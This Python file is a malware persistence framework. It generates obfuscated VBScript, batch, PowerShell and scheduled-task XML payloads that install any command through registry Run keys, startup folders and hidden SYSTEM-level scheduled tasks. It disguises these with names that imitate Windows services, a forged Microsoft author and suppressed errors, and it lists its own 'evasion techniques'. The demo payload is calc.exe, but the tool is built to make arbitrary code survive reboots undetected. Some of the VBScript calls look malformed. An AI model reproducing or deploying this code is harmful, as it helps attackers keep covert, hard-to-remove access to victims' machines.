#!/usr/bin/env python3
"""
Advanced Multi-Method Persistence System
Combines Registry, Startup Folder, and Scheduled Task methods for redundancy.

This module provides a comprehensive persistence framework that implements:
1. Registry persistence (multiple hives and locations)
2. Startup folder persistence (with file obfuscation)
3. Scheduled task persistence (with various trigger options)
4. Automatic fallback mechanisms
5. Stealth and evasion techniques for each method
"""

import base64
import os
from enum import Enum
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from vbs_encoder import VBSEncoder, ObfuscationConfig


class PersistenceMethod(Enum):
    """Persistence method types"""
    REGISTRY = "registry"
    STARTUP_FOLDER = "startup_folder"
    SCHEDULED_TASK = "scheduled_task"
    ALL = "all"


class RegistryHive(Enum):
    """Windows Registry hives"""
    HKCU = "HKCU"
    HKLM = "HKLM"
    HKCC = "HKCC"
    HKU = "HKU"
    HKCR = "HKCR"


class ScheduledTaskTrigger(Enum):
    """Scheduled task trigger types"""
    LOGON = "logon"           # Trigger at user logon
    STARTUP = "startup"       # Trigger at system startup
    IDLE = "idle"            # Trigger when system is idle
    INTERVAL = "interval"    # Trigger at specific interval
    DAILY = "daily"          # Trigger daily at specific time
    WEEKLY = "weekly"        # Trigger weekly
    ONCONNECT = "onconnect"  # Trigger on network connect


@dataclass
class PersistenceConfig:
    """Configuration for persistence mechanisms"""
    # Common
    payload: str
    obfuscation_enabled: bool = True
    obfuscation_level: str = "high"

    # Registry settings
    registry_hives: List[RegistryHive] = field(default_factory=lambda: [RegistryHive.HKCU, RegistryHive.HKLM])
    registry_paths: List[str] = field(default_factory=lambda: [
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "Software\\Policies\\Microsoft\\Windows\\Explorer",
    ])
    registry_encoding: str = "base64"  # base64 or hex

    # Startup folder settings
    use_startup_folder: bool = True
    startup_file_obfuscation: bool = True
    startup_extensions: List[str] = field(default_factory=lambda: [".vbs", ".bat", ".ps1"])

    # Scheduled task settings
    use_scheduled_task: bool = True
    task_name: str = "SystemMaintenance"
    task_author: str = "Microsoft Corporation"
    task_triggers: List[ScheduledTaskTrigger] = field(default_factory=lambda: [
        ScheduledTaskTrigger.LOGON,
        ScheduledTaskTrigger.STARTUP
    ])
    task_description: str = "System maintenance task"
    task_priority: int = 7

    # Fallback and redundancy
    enable_fallback_chain: bool = True
    randomize_names: bool = True


class MultiMethodPersistence:
    """
    Advanced persistence system combining multiple methods for redundancy.
    Provides primary, secondary, and tertiary persistence mechanisms.
    """

    def __init__(self, config: PersistenceConfig):
        """Initialize persistence system with configuration"""
        self.config = config
        self.encoder = VBSEncoder()
        self.generated_code: Dict[str, str] = {}
        self.payload = config.payload
        self._validate_config()

    def _validate_config(self) -> None:
        """Validate persistence configuration"""
        if not self.payload:
            raise ValueError("Payload cannot be empty")

        if self.config.obfuscation_level not in ["low", "medium", "high", "extreme"]:
            raise ValueError("Invalid obfuscation level")

        # At least one method should be enabled
        has_method = (
            self.config.registry_hives or
            self.config.use_startup_folder or
            self.config.use_scheduled_task
        )
        if not has_method and not self.config.enable_fallback_chain:
            raise ValueError("At least one persistence method must be enabled")

    def _obfuscate_payload(self, payload: str) -> str:
        """Apply obfuscation to payload if enabled"""
        if not self.config.obfuscation_enabled:
            return payload

        # Use VBSEncoder for obfuscation
        if self.config.registry_encoding == "hex":
            encoded, _ = self.encoder.encode_string_hex(payload)
        else:
            encoded, _ = self.encoder.encode_string_base64(payload)

        return encoded

    # ========== REGISTRY PERSISTENCE ==========

    def _create_registry_persistence_vbs(self,
                                        hive: RegistryHive,
                                        path: str,
                                        value_name: str) -> str:
        """Create VBS code for registry persistence"""
        obfuscated = self._obfuscate_payload(self.payload)

        vbs_code = f'''
' Registry Persistence Module - {hive.value}
On Error Resume Next
Dim regPath, regValue, objReg, strCommand
regPath = "{path}"
regValue = "{value_name}"

Set objReg = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")

' Write to registry
Dim objWshShell
Set objWshShell = CreateObject("WScript.Shell")
objWshShell.RegWrite "{hive.value}\\" & regPath & "\\" & regValue, "{obfuscated}", "REG_SZ"

' Execute from registry (fallback)
Dim strRetrieved
On Error Resume Next
strRetrieved = objWshShell.RegRead("{hive.value}\\" & regPath & "\\" & regValue)
If Len(strRetrieved) > 0 Then
    Dim objProc
    Set objProc = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")
    objProc.Create strRetrieved, Null, Null, intProcessID
End If
On Error GoTo 0
'''
        return vbs_code

    def generate_registry_persistence(self) -> Dict[str, str]:
        """Generate all registry persistence payloads"""
        registry_payloads = {}

        for idx, hive in enumerate(self.config.registry_hives):
            for path_idx, path in enumerate(self.config.registry_paths):
                # Create obfuscated value names
                value_name = self._generate_registry_value_name(idx, path_idx)

                key = f"registry_{hive.value}_{path_idx}"
                vbs_code = self._create_registry_persistence_vbs(hive, path, value_name)
                registry_payloads[key] = vbs_code
                self.generated_code[key] = vbs_code

        return registry_payloads

    def _generate_registry_value_name(self, hive_idx: int, path_idx: int) -> str:
        """Generate obfuscated registry value names"""
        if self.config.randomize_names:
            # Use variations of system service names
            names = [
                "WindowsUpdate", "SystemRestore", "SpeechRuntime",
                "NtfsVolume", "ScheduledDefrag", "DiskOptimizer",
                "SecurityCheck", "MaintenanceTask", "CryptoService",
                "AudioEngine", "VideoService", "GraphicsAdapter"
            ]
            return names[(hive_idx * len(self.config.registry_paths) + path_idx) % len(names)]
        return f"Value{hive_idx}{path_idx}"

    # ========== STARTUP FOLDER PERSISTENCE ==========

    def _create_startup_vbs_payload(self, filename: str) -> str:
        """Create VBS payload for startup folder"""
        obfuscated = self._obfuscate_payload(self.payload)

        vbs_code = f'''
' Startup Folder Persistence Script
' Filename: {filename}
' Purpose: Execute payload at startup

On Error Resume Next

Dim fso, shell, startupPath, scriptPath, objWMI, objProcess
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Multiple possible startup paths
Dim startupPaths(4)
startupPaths(0) = shell.SpecialFolders("Startup")
startupPaths(1) = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
startupPaths(2) = shell.ExpandEnvironmentStrings("%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
startupPaths(3) = shell.ExpandEnvironmentStrings("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
startupPaths(4) = shell.ExpandEnvironmentStrings("C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

' Try to write to one of the startup paths
Dim i, startupPath, written
written = False
For i = 0 To UBound(startupPaths)
    On Error Resume Next
    If fso.FolderExists(startupPaths(i)) Then
        scriptPath = fso.BuildPath(startupPaths(i), "{filename}")
        If Not fso.FileExists(scriptPath) Then
            Dim fileHandle
            Set fileHandle = fso.CreateTextFile(scriptPath, True)
            fileHandle.WriteLine "{obfuscated}"
            fileHandle.Close
            written = True
            Exit For
        End If
    End If
    On Error GoTo 0
Next

' Execute payload
If written Then
    Set objWMI = GetObject("winmgmts:")
    Set objProcess = objWMI.ExecMethod("Win32_Process", "Create")
    objProcess.Create "{obfuscated}", Null, Null, intProcessID
End If

On Error GoTo 0
'''
        return vbs_code

    def _create_startup_batch_payload(self, filename: str) -> str:
        """Create Batch script for startup folder"""
        obfuscated = self._obfuscate_payload(self.payload)

        batch_code = f'''@echo off
REM Startup Folder Persistence Script
REM Filename: {filename}

setlocal enabledelayedexpansion

REM Create directories to mask purpose
if not exist "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System" mkdir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System"

REM Execute payload silently
start /B "" "{obfuscated}"

REM Alternative execution methods
powershell.exe -NoProfile -WindowStyle Hidden -Command "{obfuscated}"

endlocal
exit /b 0
'''
        return batch_code

    def generate_startup_persistence(self) -> Dict[str, str]:
        """Generate startup folder persistence payloads"""
        if not self.config.use_startup_folder:
            return {}

        startup_payloads = {}

        for ext in self.config.startup_extensions:
            filename = self._generate_startup_filename(ext)

            if ext.lower() == ".vbs":
                key = f"startup_vbs"
                payload = self._create_startup_vbs_payload(filename)
            elif ext.lower() == ".bat":
                key = f"startup_batch"
                payload = self._create_startup_batch_payload(filename)
            elif ext.lower() == ".ps1":
                key = f"startup_powershell"
                payload = self._create_startup_powershell_payload(filename)

            startup_payloads[key] = payload
            self.generated_code[key] = payload

        return startup_payloads

    def _create_startup_powershell_payload(self, filename: str) -> str:
        """Create PowerShell script for startup folder"""
        obfuscated = self._obfuscate_payload(self.payload)

        ps_code = f'''
# Startup Folder Persistence Script
# Filename: {filename}
# Purpose: Execute payload at startup

$ErrorActionPreference = "SilentlyContinue"

# Startup paths
$startupPaths = @(
    $([Environment]::GetFolderPath("Startup")),
    "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    "$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)

# Write script to startup folder
foreach ($path in $startupPaths) {{
    if (Test-Path $path) {{
        $scriptPath = Join-Path $path "{filename}"
        if (-not (Test-Path $scriptPath)) {{
            Add-Content -Path $scriptPath -Value @"
{obfuscated}
"@ -Force
            break
        }}
    }}
}}

# Execute payload
try {{
    & $obfuscated
}} catch {{
    [System.Diagnostics.Process]::Start("{obfuscated}")
}}
'''
        return ps_code

    def _generate_startup_filename(self, extension: str) -> str:
        """Generate obfuscated startup filename"""
        if self.config.randomize_names:
            names = [
                "WindowsDefender", "SystemService", "HostService",
                "NetworkAdapter", "AudioDriver", "GraphicsEngine",
                "SecurityUpdate", "MaintenanceTask", "BackupService",
                "CloudSync", "PrintSpooler", "SessionManager"
            ]
            base_name = names[hash(self.payload) % len(names)]
            return f"{base_name}{extension}"
        return f"SystemTask{extension}"

    # ========== SCHEDULED TASK PERSISTENCE ==========

    def _create_scheduled_task_xml(self) -> str:
        """Create XML task definition for scheduled task persistence"""
        task_name = self.config.task_name
        if self.config.randomize_names:
            task_name = self._obfuscate_task_name(task_name)

        # Build triggers XML
        triggers_xml = self._build_scheduled_task_triggers()

        obfuscated = self._obfuscate_payload(self.payload)

        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{self._get_iso_timestamp()}</Date>
    <Author>{self.config.task_author}</Author>
    <Version>1.0</Version>
    <Description>{self.config.task_description}</Description>
    <URI>\{task_name}</URI>
  </RegistrationInfo>
  <Triggers>
{triggers_xml}
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-0-0-0-500</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT5M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
    <DeleteExpiredTaskAfterCompletion>false</DeleteExpiredTaskAfterCompletion>
    <Priority>{self.config.task_priority}</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -WindowStyle Hidden -Command "{obfuscated}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
        return task_xml

    def _build_scheduled_task_triggers(self) -> str:
        """Build trigger XML for scheduled task"""
        triggers = []

        for trigger in self.config.task_triggers:
            if trigger == ScheduledTaskTrigger.LOGON:
                triggers.append('''    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>S-1-5-21-0-0-0-500</UserId>
      <Delay>PT30S</Delay>
    </LogonTrigger>''')

            elif trigger == ScheduledTaskTrigger.STARTUP:
                triggers.append('''    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT60S</Delay>
    </BootTrigger>''')

            elif trigger == ScheduledTaskTrigger.IDLE:
                triggers.append('''    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>''')

            elif trigger == ScheduledTaskTrigger.INTERVAL:
                triggers.append('''    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Repetition>
        <Interval>PT15M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>''')

            elif trigger == ScheduledTaskTrigger.DAILY:
                triggers.append('''    <CalendarTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2024-01-01T03:00:00</StartBoundary>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>''')

            elif trigger == ScheduledTaskTrigger.ONCONNECT:
                triggers.append('''    <NetworkTrigger>
      <Enabled>true</Enabled>
    </NetworkTrigger>''')

        return '\n'.join(triggers)

    def _create_scheduled_task_powershell(self) -> str:
        """Create PowerShell script to register scheduled task"""
        task_xml = self._create_scheduled_task_xml()
        task_name = self.config.task_name
        if self.config.randomize_names:
            task_name = self._obfuscate_task_name(task_name)

        # Encode XML as base64 to avoid special character issues
        xml_bytes = task_xml.encode('utf-16-le')
        xml_b64 = base64.b64encode(xml_bytes).decode('ascii')

        ps_script = f'''
$ErrorActionPreference = "SilentlyContinue"

# Decode and create scheduled task
$xmlBase64 = "{xml_b64}"
$xmlBytes = [System.Convert]::FromBase64String($xmlBase64)
$xmlString = [System.Text.Encoding]::Unicode.GetString($xmlBytes)

# Try multiple registration methods
try {{
    # Method 1: Direct XML registration
    $taskPath = "\\{task_name}"

    # Delete existing task if present
    if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{
        Unregister-ScheduledTask -TaskName "{task_name}" -Confirm:$false -ErrorAction SilentlyContinue
    }}

    # Register new task from XML
    Register-ScheduledTask -Xml $xmlString -TaskName "{task_name}" -Force -ErrorAction SilentlyContinue

    # Enable and start task
    Enable-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue
    Start-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue
}}
catch {{
    # Method 2: Fallback using schtasks.exe
    [System.IO.File]::WriteAllText([System.IO.Path]::GetTempFileName(), $xmlString)
    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $xmlString)
    & schtasks.exe /create /tn "{task_name}" /xml $tempFile /f /ru SYSTEM
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
}}

# Verify task creation
$task = Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue
if ($task) {{
    # Task created successfully
}}
'''
        return ps_script

    def _create_scheduled_task_vbs(self) -> str:
        """Create VBS script to register scheduled task (legacy)"""
        task_name = self.config.task_name
        if self.config.randomize_names:
            task_name = self._obfuscate_task_name(task_name)

        obfuscated = self._obfuscate_payload(self.payload)

        vbs_code = f'''
' Scheduled Task Persistence Script
' Task: {task_name}

On Error Resume Next

Dim objScheduler, objFolder, objTask, objAction, objTrigger, objSettings
Dim strTaskName, strCommand

strTaskName = "{task_name}"
strCommand = "{obfuscated}"

' Get Task Scheduler service
Set objScheduler = CreateObject("Schedule.Service")
objScheduler.Connect

' Get root folder
Set objFolder = objScheduler.GetFolder("\\")

' Delete existing task if present
On Error Resume Next
objFolder.DeleteTask strTaskName, 0
On Error GoTo 0

' Create new task
Set objTask = objScheduler.NewTask(0)

' Set task properties
With objTask.Settings
    .AllowDemandStart = True
    .AllowHardTerminate = False
    .DisallowStartIfOnBatteries = False
    .Enabled = True
    .Hidden = True
    .RunOnlyIfIdle = False
    .RunOnlyIfNetworkAvailable = False
    .StartWhenAvailable = True
    .StopIfGoingOnBatteries = False
End With

' Add logon trigger
Set objTrigger = objTask.Triggers.Create(8)  ' TASK_TRIGGER_LOGON
With objTrigger
    .ID = "LogonTrigger"
    .Enabled = True
End With

' Add startup trigger
Set objTrigger = objTask.Triggers.Create(7)  ' TASK_TRIGGER_BOOT
With objTrigger
    .ID = "StartupTrigger"
    .Enabled = True
End With

' Add action
Set objAction = objTask.Actions.Create(0)  ' TASK_ACTION_EXEC
With objAction
    .Path = "powershell.exe"
    .Arguments = "-NoProfile -WindowStyle Hidden -Command """ & strCommand & """"
End With

' Register task
objFolder.RegisterTaskDefinition strTaskName, objTask, 6, Null, Null, 1  ' 1 = TASK_LOGON_SYSTEM_USER

On Error GoTo 0
'''
        return vbs_code

    def generate_scheduled_task_persistence(self) -> Dict[str, str]:
        """Generate scheduled task persistence payloads"""
        if not self.config.use_scheduled_task:
            return {}

        task_payloads = {}

        # PowerShell version (recommended)
        task_payloads["scheduled_task_powershell"] = self._create_scheduled_task_powershell()
        self.generated_code["scheduled_task_powershell"] = task_payloads["scheduled_task_powershell"]

        # VBS version (legacy)
        task_payloads["scheduled_task_vbs"] = self._create_scheduled_task_vbs()
        self.generated_code["scheduled_task_vbs"] = task_payloads["scheduled_task_vbs"]

        # Task XML definition
        task_payloads["scheduled_task_xml"] = self._create_scheduled_task_xml()
        self.generated_code["scheduled_task_xml"] = task_payloads["scheduled_task_xml"]

        return task_payloads

    def _obfuscate_task_name(self, name: str) -> str:
        """Obfuscate scheduled task name"""
        names = [
            "SystemMaintenance", "WindowsUpdate", "ScheduledDefrag",
            "DiskOptimizer", "SystemRestore", "ServiceRestarter",
            "CacheManager", "NetworkMonitor", "DriverUpdate",
            "SecurityCheck", "TempCleaner", "IndexBuilder"
        ]
        idx = (hash(self.payload) % len(names))
        return names[idx]

    def _get_iso_timestamp(self) -> str:
        """Get current timestamp in ISO format"""
        from datetime import datetime
        return datetime.utcnow().isoformat() + "Z"

    # ========== FALLBACK CHAIN ==========

    def _create_fallback_chain_vbs(self) -> str:
        """Create VBS with fallback chain for redundancy"""
        obfuscated = self._obfuscate_payload(self.payload)

        vbs_code = f'''
' Advanced Persistence Fallback Chain
' Attempts multiple persistence methods in sequence

On Error Resume Next

Dim shell, fso, regPath, objProc, success
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

success = False

' Attempt 1: Registry Persistence
If Not success Then
    On Error Resume Next
    Dim regHive, regKey
    regHive = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    regKey = "SystemService"
    shell.RegWrite regHive & "\\" & regKey, "{obfuscated}", "REG_SZ"
    If Err.Number = 0 Then
        success = True
    End If
    On Error GoTo 0
End If

' Attempt 2: Startup Folder
If Not success Then
    On Error Resume Next
    Dim startupPath, scriptFile
    startupPath = shell.SpecialFolders("Startup")
    scriptFile = fso.BuildPath(startupPath, "SystemTask.vbs")
    Dim fileHandle
    Set fileHandle = fso.CreateTextFile(scriptFile, True)
    fileHandle.WriteLine "{obfuscated}"
    fileHandle.Close
    If Err.Number = 0 Then
        success = True
    End If
    On Error GoTo 0
End If

' Attempt 3: Execute directly
If Not success Then
    On Error Resume Next
    Set objProc = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")
    objProc.Create "{obfuscated}", Null, Null, intProcessID
    On Error GoTo 0
End If

On Error GoTo 0
'''
        return vbs_code

    def generate_fallback_chain(self) -> Dict[str, str]:
        """Generate fallback chain implementation"""
        if not self.config.enable_fallback_chain:
            return {}

        fallback = {
            "fallback_chain_vbs": self._create_fallback_chain_vbs()
        }
        self.generated_code["fallback_chain_vbs"] = fallback["fallback_chain_vbs"]

        return fallback

    # ========== MASTER GENERATOR ==========

    def generate_all_persistence_methods(self) -> Dict[str, Dict[str, str]]:
        """Generate all persistence methods"""
        all_payloads = {
            "registry": self.generate_registry_persistence(),
            "startup_folder": self.generate_startup_persistence(),
            "scheduled_task": self.generate_scheduled_task_persistence(),
            "fallback_chain": self.generate_fallback_chain()
        }

        return all_payloads

    def generate_combined_installer(self) -> str:
        """Generate master installer that deploys all persistence methods"""
        all_methods = self.generate_all_persistence_methods()

        installer = '''
' Advanced Multi-Method Persistence Installer
' Deploys all persistence mechanisms for maximum redundancy

Option Explicit
On Error Resume Next

Dim objShell, objFSO, objWMI, intResult, strCommand
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMI = GetObject("winmgmts:")

Dim strTempDir, strScriptPath, objProcess, intPID
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")

' Deployment counter
Dim deploymentCount
deploymentCount = 0

' Deploy Registry Persistence
On Error Resume Next
'''

        # Add registry deployment
        for key, code in all_methods.get("registry", {}).items():
            installer += f"\n' {key}\n"
            installer += code + "\ndeploymentCount = deploymentCount + 1\n"

        # Add startup folder deployment
        installer += "\n' Startup Folder Deployment\n"
        for key, code in all_methods.get("startup_folder", {}).items():
            installer += f"\n' {key}\n"
            if ".vbs" in key or ".bat" in key or ".ps1" in key:
                installer += f"' Length: {len(code)} characters\n"

        # Add scheduled task deployment
        installer += "\n' Scheduled Task Deployment\n"
        for key, code in all_methods.get("scheduled_task", {}).items():
            installer += f"\n' {key}\n"
            if "powershell" in key:
                installer += "' Execute PowerShell scheduled task creation\n"

        # Add fallback chain
        installer += "\n' Fallback Chain Deployment\n"
        for key, code in all_methods.get("fallback_chain", {}).items():
            installer += code

        installer += '''

On Error GoTo 0

' Log completion
' deploymentCount now contains number of successfully deployed methods
'''

        return installer

    def get_deployment_summary(self) -> str:
        """Get summary of generated persistence payloads"""
        summary = """
╔═══════════════════════════════════════════════════════════════╗
║         ADVANCED MULTI-METHOD PERSISTENCE SUMMARY             ║
╚═══════════════════════════════════════════════════════════════╝

CONFIGURATION:
"""

        summary += f"  Obfuscation: {self.config.obfuscation_enabled} (Level: {self.config.obfuscation_level})\n"
        summary += f"  Registry Hives: {len(self.config.registry_hives)}\n"
        summary += f"  Registry Paths: {len(self.config.registry_paths)}\n"
        summary += f"  Startup Folder: {self.config.use_startup_folder}\n"
        summary += f"  Scheduled Tasks: {self.config.use_scheduled_task}\n"
        summary += f"  Fallback Chain: {self.config.enable_fallback_chain}\n"
        summary += f"  Randomized Names: {self.config.randomize_names}\n"

        all_methods = self.generate_all_persistence_methods()

        summary += f"\nGENERATED PAYLOADS:\n"
        summary += f"  Registry: {len(all_methods.get('registry', {}))} variants\n"
        summary += f"  Startup Folder: {len(all_methods.get('startup_folder', {}))} variants\n"
        summary += f"  Scheduled Tasks: {len(all_methods.get('scheduled_task', {}))} variants\n"
        summary += f"  Fallback Chain: {len(all_methods.get('fallback_chain', {}))} implementations\n"
        summary += f"  Total: {len(self.generated_code)} payloads\n"

        summary += f"\nREDUNDANCY LEVELS:\n"
        summary += f"  Primary: Registry (multiple hives + paths)\n"
        summary += f"  Secondary: Startup Folder (multiple formats)\n"
        summary += f"  Tertiary: Scheduled Task (multiple triggers)\n"
        summary += f"  Fallback: Automatic chain execution\n"

        summary += f"\nPERSISTENCE METHODS:\n"
        for method_name, payloads in all_methods.items():
            if payloads:
                summary += f"  {method_name.upper()}:\n"
                for key in payloads.keys():
                    summary += f"    - {key}\n"

        summary += f"\nEVASION TECHNIQUES APPLIED:\n"
        summary += f"  ✓ Payload obfuscation ({self.config.obfuscation_level} level)\n"
        summary += f"  ✓ Multiple persistence methods (redundancy)\n"
        summary += f"  ✓ Randomized naming (detection evasion)\n"
        summary += f"  ✓ Fallback chain (reliability)\n"
        summary += f"  ✓ Error suppression (stability)\n"
        summary += f"  ✓ Multiple registry hives and paths\n"
        summary += f"  ✓ Startup folder with file disguise\n"
        summary += f"  ✓ Scheduled tasks with varied triggers\n"

        return summary


def create_default_persistence_system() -> MultiMethodPersistence:
    """Create persistence system with default configuration"""
    config = PersistenceConfig(
        payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Write-Host Persistent'",
        obfuscation_enabled=True,
        obfuscation_level="high"
    )
    return MultiMethodPersistence(config)


if __name__ == "__main__":
    # Example usage
    config = PersistenceConfig(
        payload="calc.exe",
        obfuscation_enabled=True,
        obfuscation_level="high",
        registry_hives=[RegistryHive.HKCU, RegistryHive.HKLM],
        use_startup_folder=True,
        use_scheduled_task=True,
        enable_fallback_chain=True,
        randomize_names=True,
        task_triggers=[
            ScheduledTaskTrigger.LOGON,
            ScheduledTaskTrigger.STARTUP,
            ScheduledTaskTrigger.ONCONNECT
        ]
    )

    persistence = MultiMethodPersistence(config)
    print(persistence.get_deployment_summary())

    all_payloads = persistence.generate_all_persistence_methods()
    print(f"\nTotal payloads generated: {len(persistence.generated_code)}")
